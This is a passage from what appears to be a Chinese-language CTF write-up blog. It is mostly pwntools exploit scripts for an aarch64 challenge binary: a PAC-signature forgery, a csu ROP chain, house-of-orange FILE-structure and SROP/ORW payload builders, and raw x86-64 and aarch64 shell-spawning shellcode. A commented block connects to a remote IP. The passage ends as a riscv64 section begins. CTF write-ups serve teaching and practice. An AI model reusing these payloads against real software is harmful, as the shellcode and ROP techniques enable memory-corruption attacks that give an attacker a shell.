'\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span><span class="params">(_flags = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_backup_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_marker = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_chain = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _fileno = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _lock = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _wide_data = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _mode = <span class="number">0</span>)</span>:</span></span><br><span class="line">    file_struct = p32(_flags) + \</span><br><span class="line">             p32(<span class="number">0</span>) + \</span><br><span class="line">             p64(_IO_read_ptr) + \</span><br><span class="line">             p64(_IO_read_end) + \</span><br><span class="line">             p64(_IO_read_base) + \</span><br><span class="line">             p64(_IO_write_base) + \</span><br><span class="line">             p64(_IO_write_ptr) + \</span><br><span class="line">             p64(_IO_write_end) + \</span><br><span class="line">             p64(_IO_buf_base) + \</span><br><span class="line">             p64(_IO_buf_end) + \</span><br><span class="line">             p64(_IO_save_base) + \</span><br><span class="line">             p64(_IO_backup_base) + \</span><br><span class="line">             p64(_IO_save_end) + \</span><br><span class="line">             p64(_IO_marker) + \</span><br><span class="line">             p64(_IO_chain) + \</span><br><span class="line">             p32(_fileno)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0x88</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_lock)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xa0</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_wide_data)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    file_struct += p64(_mode)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    <span class="keyword">return</span> file_struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file_flush_str_jumps</span><span class="params">(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr)</span>:</span></span><br><span class="line">    payload = pack_file(_flags = <span class="number">0</span>,</span><br><span class="line">                        _IO_read_ptr = <span class="number">0x61</span>, <span class="comment">#smallbin4file_size</span></span><br><span class="line">                        _IO_read_base = _IO_list_all_ptr<span class="number">-0x10</span>, <span class="comment"># unsorted bin attack _IO_list_all_ptr,</span></span><br><span class="line">                        _IO_write_base = <span class="number">0</span>,</span><br><span class="line">                        _IO_write_ptr = <span class="number">1</span>,</span><br><span class="line">                        _IO_buf_base = binsh_addr,</span><br><span class="line">                        _mode = <span class="number">0</span>,</span><br><span class="line">                       )</span><br><span class="line">    payload += p64(_IO_str_jumps_addr<span class="number">-8</span>)  <span class="comment"># vtable</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># paddding</span></span><br><span class="line">    payload += p64(system_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io_str_jumps_offset</span><span class="params">(libc)</span>:</span></span><br><span class="line">    IO_file_jumps_offset = libc.sym[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">    IO_str_underflow_offset = libc.sym[<span class="string">'_IO_str_underflow'</span>]</span><br><span class="line">    <span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">        possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">        <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">            <span class="comment"># print possible_IO_str_jumps_offset</span></span><br><span class="line">            <span class="keyword">return</span> possible_IO_str_jumps_offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">house_of_orange_payload</span><span class="params">(libc, libc_base)</span>:</span></span><br><span class="line">  io_str_jump = libc_base + get_io_str_jumps_offset(libc)</span><br><span class="line">  io_list_all = libc_base + libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">  system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">  bin_sh = libc_base + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">  payload = pack_file_flush_str_jumps(io_str_jump, io_list_all, system, bin_sh)</span><br><span class="line">  <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ms</span><span class="params">(name,addr)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> name + <span class="string">"----&gt;"</span> + hex(addr)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(mallocr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print &#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+mallocr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(mallocr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># with open('1.txt','wb+') as f:</span></span><br><span class="line"><span class="comment">#     s = ""</span></span><br><span class="line"><span class="comment">#     for i in shellcode:</span></span><br><span class="line"><span class="comment">#         s += "0x" + i.encode("hex")</span></span><br><span class="line"><span class="comment">#     for i in s:</span></span><br><span class="line"><span class="comment">#         f.write(i)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def mid_overflow(offset,func_got,rdi,rsi,rdx,next_func):</span></span><br><span class="line"><span class="comment"># 	payload = ''</span></span><br><span class="line"><span class="comment"># 	payload += 'a'*offset</span></span><br><span class="line"><span class="comment">#   payload += 'aaaaaaaa'</span></span><br><span class="line"><span class="comment"># 	payload += p64(pppppp_ret)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(1)</span></span><br><span class="line"><span class="comment"># 	payload += p64(func_got)</span></span><br><span class="line"><span class="comment"># 	payload += p64(rdx)</span></span><br><span class="line"><span class="comment"># 	payload += p64(rsi)</span></span><br><span class="line"><span class="comment"># 	payload += p64(rdi)</span></span><br><span class="line"><span class="comment"># 	payload += p64(mov_ret)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(next_func)</span></span><br><span class="line"><span class="comment"># 	ru('Input:\n')</span></span><br><span class="line"><span class="comment"># 	sd(payload)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mid_pay</span><span class="params">(ret_addr,ret2_addr,func_got,x0,x1,x2,next_func)</span>:</span></span><br><span class="line">	py = <span class="string">''</span></span><br><span class="line">	py += p64(ret_addr)</span><br><span class="line">	py += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">	py += p64(ret2_addr)</span><br><span class="line">	py += p64(<span class="number">0</span>)</span><br><span class="line">	py += p64(<span class="number">1</span>)</span><br><span class="line">	py += p64(func_got)</span><br><span class="line">	py += p64(x0)</span><br><span class="line">	py += p64(x1)</span><br><span class="line">	py += p64(x2)</span><br><span class="line">	py += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">	py += p64(next_func)</span><br><span class="line">	py += p64(<span class="number">0</span>)</span><br><span class="line">	py += p64(<span class="number">1</span>)</span><br><span class="line">	py += p64(x1)</span><br><span class="line">	py += p64(x1+<span class="number">8</span>)</span><br><span class="line">	py += p64(x1+<span class="number">16</span>)</span><br><span class="line">	py += p64(x2+<span class="number">24</span>)</span><br><span class="line">	<span class="keyword">return</span> py</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"identity: "</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lock</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">"idx: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span><span class="params">(index,py)</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"idx: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    sd(py)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(a1)</span>:</span></span><br><span class="line">    a7 = (a1&lt;&lt;<span class="number">7</span>)&amp;<span class="number">0xffffffffffffffff</span></span><br><span class="line">    a0 = ((a1 ^ a7 ^ ((a1 ^ a7) &gt;&gt; <span class="number">11</span>)) &lt;&lt; <span class="number">31</span>)&amp;<span class="number">0xffffffffffffffff</span></span><br><span class="line">    tmp = a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ a7) &gt;&gt; <span class="number">11</span>) ^ ((a1 ^ a7 ^ ((a1 ^ a7) &gt;&gt; <span class="number">11</span>)) &lt;&lt; <span class="number">31</span>) ^ ((a1 ^ a7 ^ ((a1 ^ a7) &gt;&gt; <span class="number">11</span>) ^ a0) &gt;&gt; <span class="number">13</span>)</span><br><span class="line">    <span class="keyword">return</span> tmp&amp;<span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cal_pac</span><span class="params">(addr,pac_addr)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">		v = get_addr(i,addr)</span><br><span class="line">		<span class="keyword">if</span> sign(v)==pac_addr:</span><br><span class="line">			<span class="keyword">return</span> i</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_addr</span><span class="params">(pac,addr)</span>:</span></span><br><span class="line">	v = (pac&lt;&lt;<span class="number">8</span>*<span class="number">6</span>)+addr</span><br><span class="line">	<span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">number = <span class="number">0x010a9fc70042</span></span><br><span class="line">ret_addr = <span class="number">0x000000000400FF8</span></span><br><span class="line">ret2_addr = <span class="number">0x000000000400FD8</span></span><br><span class="line">ru(<span class="string">"input your name: "</span>)</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += p64(ret_addr)+p64(<span class="number">0</span>)+p64(number)+p64(<span class="number">0</span>)</span><br><span class="line">sl(py)</span><br><span class="line">add(py)</span><br><span class="line">lock(<span class="number">-1</span>)</span><br><span class="line">lock(<span class="number">-2</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">"name: "</span>)</span><br><span class="line">pac_addr = u64(rc(<span class="number">8</span>))</span><br><span class="line">ms(<span class="string">"pac_addr"</span>,pac_addr)</span><br><span class="line">pac_num = cal_pac(ret_addr,pac_addr)</span><br><span class="line">ms(<span class="string">"pac_num"</span>,pac_num)</span><br><span class="line">ret_addr = get_addr(pac_num,ret_addr)</span><br><span class="line">read_got = <span class="number">0x000000000411FD8</span></span><br><span class="line">puts_got = <span class="number">0x0000000000411FD0</span></span><br><span class="line"></span><br><span class="line">system = <span class="number">0x4000888400</span></span><br><span class="line">bss = <span class="number">0x0412010</span></span><br><span class="line"></span><br><span class="line">pp = <span class="string">""</span></span><br><span class="line">pp += <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">pp += <span class="string">'b'</span>*<span class="number">8</span></span><br><span class="line">pp += mid_pay(ret_addr,ret2_addr,read_got,<span class="number">0</span>,bss+<span class="number">0x200</span>,<span class="number">0x100</span>,ret2_addr)</span><br><span class="line">auth(<span class="number">-1</span>,pp)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">sl(p64(system)+<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"><span class="comment">#libc_base = u64(rc(6).ljust(8,'\x00'))</span></span><br><span class="line"><span class="comment">#print "libc_base----&gt;" + hex(libc_base)</span></span><br><span class="line"><span class="comment">#malloc_hook = libc_base + libc.sym["__malloc_hook"]</span></span><br><span class="line"><span class="comment">#fake_chunk = malloc_hook - 0x23</span></span><br><span class="line"><span class="comment">#realloc = libc_base + libc.sym["realloc"]</span></span><br><span class="line"><span class="comment">#free_hook = libc_base + libc.sym["__free_hook"]</span></span><br><span class="line"><span class="comment">#system = libc_base + libc.sym["system"]</span></span><br><span class="line"><span class="comment">#binsh = libc_base + libc.search("/bin/sh").next()</span></span><br><span class="line"><span class="comment">#setcontext = libc_base + libc.sym["setcontext"]</span></span><br><span class="line"><span class="comment">#pop_rax_ret = libc_base + 0x000000000004a550 </span></span><br><span class="line"><span class="comment">#pop_rsi_ret = libc_base + 0x0000000000027529 </span></span><br><span class="line"><span class="comment">#pop_rdx_r12_ret = libc_base + 0x000000000011c1e1</span></span><br><span class="line"><span class="comment">#pop_rdi_ret = libc_base + 0x0000000000026b72 </span></span><br><span class="line"><span class="comment">#syscall_ret = libc_base + 0x0000000000066229</span></span><br><span class="line"><span class="comment">#magic_gadget = libc_base + 0x00000000001547a0</span></span><br><span class="line"><span class="comment">#0x00000000001547a0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; #call qword ptr [rdx + 0x20]; </span></span><br><span class="line"><span class="comment">#ret = libc_base + 0x00000000000c1479</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#heap_addr = u64(rc(6).ljust(8,'\x00'))-0x470</span></span><br><span class="line"><span class="comment">#print "heap_addr---&gt;" + hex(heap_addr)</span></span><br><span class="line"><span class="comment">#pay_start = heap_addr+0xec0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#def srop_pay():</span></span><br><span class="line">    <span class="comment">#pay = ''</span></span><br><span class="line">    <span class="comment">#pay += p64(0) + p64(pay_start)</span></span><br><span class="line">    <span class="comment">#pay = pay.ljust(0x20,'\x00')</span></span><br><span class="line">    <span class="comment">#pay += p64(setcontext+33)</span></span><br><span class="line">    <span class="comment">#pay = pay.ljust(0x68,'\x00')</span></span><br><span class="line">    <span class="comment">#pay += p64(0)</span></span><br><span class="line">    <span class="comment">#pay += p64(pay_start)</span></span><br><span class="line">    <span class="comment">#pay += p64(0)</span></span><br><span class="line">    <span class="comment">#pay += p64(0)</span></span><br><span class="line">    <span class="comment">#pay += p64(0x110)</span></span><br><span class="line">    <span class="comment">#pay = pay.ljust(0xa0,'\x00')</span></span><br><span class="line">    <span class="comment">#pay += p64(pay_start)</span></span><br><span class="line">    <span class="comment">#pay += p64(syscall_ret)</span></span><br><span class="line">    <span class="comment">#pay = pay.ljust(0xe0,'\x00')</span></span><br><span class="line">    <span class="comment">#pay += p64(pay_start)</span></span><br><span class="line">    <span class="comment">#return pay</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#def orw_pay():</span></span><br><span class="line">    <span class="comment">#pay = ''</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rdi_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(pay_start+0x100)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rsi_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(0)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rax_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(0x2)</span></span><br><span class="line">    <span class="comment">#pay += p64(syscall_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rdi_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(3)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rsi_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(heap_addr)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rdx_r12_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(0x40)</span></span><br><span class="line">    <span class="comment">#pay += p64(0)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rax_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(0x0)</span></span><br><span class="line">    <span class="comment">#pay += p64(syscall_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rdi_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(1)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rsi_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(heap_addr)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rdx_r12_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(0x40)</span></span><br><span class="line">    <span class="comment">#pay += p64(0)</span></span><br><span class="line">    <span class="comment">#pay += p64(pop_rax_ret)</span></span><br><span class="line">    <span class="comment">#pay += p64(0x1)</span></span><br><span class="line">    <span class="comment">#pay += p64(syscall_ret)</span></span><br><span class="line">    <span class="comment">#pay = pay.ljust(0x100,'a')</span></span><br><span class="line">    <span class="comment">#pay += './flag\x00\x00'</span></span><br><span class="line">    <span class="comment">#return pay</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># i = 0</span></span><br><span class="line"><span class="comment"># while 1:</span></span><br><span class="line"><span class="comment">#     print i</span></span><br><span class="line"><span class="comment">#     i += 1</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         pwn()</span></span><br><span class="line"><span class="comment">#     except EOFError:</span></span><br><span class="line"><span class="comment">#         p.close()</span></span><br><span class="line"><span class="comment">#         local = 1</span></span><br><span class="line"><span class="comment">#         elf = ELF('./note_five')</span></span><br><span class="line"><span class="comment">#         if local:</span></span><br><span class="line"><span class="comment">#             p = process('./note_five')</span></span><br><span class="line"><span class="comment">#             libc = elf.libc</span></span><br><span class="line"><span class="comment">#             continue</span></span><br><span class="line"><span class="comment">#         else:</span></span><br><span class="line"><span class="comment">#             p = remote('121.40.246.48',9999)</span></span><br><span class="line"><span class="comment">#             libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         sl("ls")</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这题也可以用shellcode的方式去打(虽然我也好奇，aarch64没有执行权限的段也能执行shellcode？我觉得是checksec和vmmap的误判，因为qemu的原因~)</p>
<p><img src="/blog_img/image-20210203190508675.png" alt="image-20210203190508675"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aarch64_getshell_code = <span class="string">"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-g"</span>,<span class="string">"1234"</span>,<span class="string">"-cpu"</span>, <span class="string">"max"</span>, <span class="string">"-L"</span>, <span class="string">"."</span>, <span class="string">"./chall"</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lock</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"idx: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"idx: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unshiftl</span><span class="params">(a,s,m=<span class="number">2</span>**<span class="number">64</span><span class="number">-1</span>)</span>:</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i*s&lt;<span class="number">64</span>:</span><br><span class="line">        lenm=((<span class="number">2</span>**<span class="number">64</span><span class="number">-1</span>)&gt;&gt;(<span class="number">64</span>-s))&lt;&lt;(s*i)</span><br><span class="line">        a^=((a&amp;lenm)&lt;&lt;s)&amp;m</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unshiftr</span><span class="params">(a,s,m=<span class="number">2</span>**<span class="number">64</span><span class="number">-1</span>)</span>:</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i*s&lt;<span class="number">64</span>:</span><br><span class="line">        lenm=(((<span class="number">2</span>**<span class="number">64</span><span class="number">-1</span>)&lt;&lt;(<span class="number">64</span>-s))&amp;(<span class="number">2</span>**<span class="number">64</span><span class="number">-1</span>))&gt;&gt;(s*i)</span><br><span class="line">        a^=((a&amp;lenm)&gt;&gt;s)&amp;m</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./chall"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./lib/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">csu1 = <span class="number">0x400FF8</span></span><br><span class="line">csu2 = <span class="number">0x400FD8</span> </span><br><span class="line"></span><br><span class="line">sh = p64(csu1) + p64(<span class="number">0</span>)</span><br><span class="line">sh += p64(<span class="number">1145141919810</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">"name: "</span>, sh)</span><br><span class="line"></span><br><span class="line">lock(<span class="number">-1</span>)</span><br><span class="line">lock(<span class="number">-2</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">"name: "</span>)</span><br><span class="line">a = u64(r.recv(<span class="number">8</span>))</span><br><span class="line">a = unshiftr(a, <span class="number">13</span>)</span><br><span class="line">a = unshiftl(a, <span class="number">31</span>)</span><br><span class="line">a = unshiftr(a, <span class="number">11</span>)</span><br><span class="line">a = unshiftl(a, <span class="number">7</span>)</span><br><span class="line">info(<span class="string">"forged addr: 0x%lx"</span> % a)</span><br><span class="line"></span><br><span class="line">auth(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">b = <span class="number">0x40008a66b0</span> - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">libc.address = b</span><br><span class="line">info(<span class="string">"libc: 0x%lx"</span> % b)</span><br><span class="line">info(<span class="string">"system: 0x%lx"</span> % libc.sym[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line">sh = <span class="string">b"a"</span>*<span class="number">0x28</span></span><br><span class="line">sh += p64(a)</span><br><span class="line">sh += p64(<span class="number">0</span>) + p64(csu2)</span><br><span class="line">sh += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">sh += p64(elf.got[<span class="string">'read'</span>]) + p64(<span class="number">0</span>)</span><br><span class="line">sh += p64(<span class="number">0x412060</span>) + p64(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sh += p64(<span class="number">0</span>) + p64(csu2)</span><br><span class="line">sh += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">sh += p64(<span class="number">0x412060</span>) + p64(<span class="number">0</span>)</span><br><span class="line">sh += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.send(sh)</span><br><span class="line">pause()</span><br><span class="line">r.send(p64(<span class="number">0x412068</span>) + <span class="string">b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="3、flag1"><a href="#3、flag1" class="headerlink" title="3、flag1"></a>3、flag1</h4><p>这题和flag0的那个逆向题是同一个文件，都是riscv64的架构。</p>
<p><img src="/blog_img/image-20210203224501696.png" alt="image-20210203224501696"></p>
<p>首先下载个交叉编译链(别人写好的)：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//static.dev.sifive.com/dev-tools/riscv64-unknown-elf-gcc-8.3.0-2019.08.0-x86_64-linux-ubuntu14.tar.gz</span></span><br></pre></td></tr></table></figure>

